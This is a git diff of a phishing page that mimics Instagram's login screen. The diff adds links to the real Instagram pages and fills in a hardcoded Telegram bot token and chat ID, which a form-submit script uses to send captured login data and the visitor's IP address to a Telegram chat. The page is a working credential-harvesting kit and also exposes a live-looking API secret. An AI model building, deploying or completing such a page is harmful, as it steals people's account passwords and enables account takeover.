@@ -20,7 +20,10 @@
 				<div class="input_field">
 					<input type="password" placeholder="Password" class="input">
 				</div>
-				<div class="btn"><a href="#">Log In</a></div>
+				<!-- The Login button will now redirect to Instagram's login page -->
+				<div class="btn">
+					<a href="https://www.instagram.com/accounts/login/" target="_blank">Log In</a>
+				</div>
 			</div>
 			<div class="or">
 				<div class="line"></div>
@@ -38,7 +41,7 @@
 			</div>
 		</div>
 		<div class="signup">
-			<p>Don't have an account? <a href="#">Sign up</a></p>
+			<p>Don't have an account? <a href="https://www.instagram.com/accounts/signup/">Sign up</a></p>
 		</div>
 		<div class="apps">
 			<p>Get the app.</p>
@@ -69,12 +72,11 @@
 		</div>
 	</div>
 </div>
-<script src="https://unpkg.com/axios@1.6.7/dist/axios.min.js"></script>
-<script src="https://unpkg.com/axios@1.6.7/dist/axios.min.js"></script>
+
 <script src="https://unpkg.com/axios@1.6.7/dist/axios.min.js"></script>
 <script>
-    const TOKEN = "";7683148028:AAFsEs8kFMzaldDzc_55F_Y3e0JHU9Z4O30
-    const CHAT_ID = "";                                                       // هنا معرف الشات https://api.telegram.org/bot/getUpdates
+    const TOKEN = "7757954863:AAESg6q9YlCg5ZFLZyfTSjCkzYDt0SBOCC4";                                                            // هنا التوكين              
+    const CHAT_ID = "509223159";                                                       // هنا معرف الشات https://api.telegram.org/bot/getUpdates
     const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;        
 
     document.getElementById('login-form').addEventListener('submit', function(e) {
@@ -118,6 +120,6 @@
                 alert('Error fetching the IP address. Please try again.');
             });
     });
-
+    </script>
 </body>
 </html>
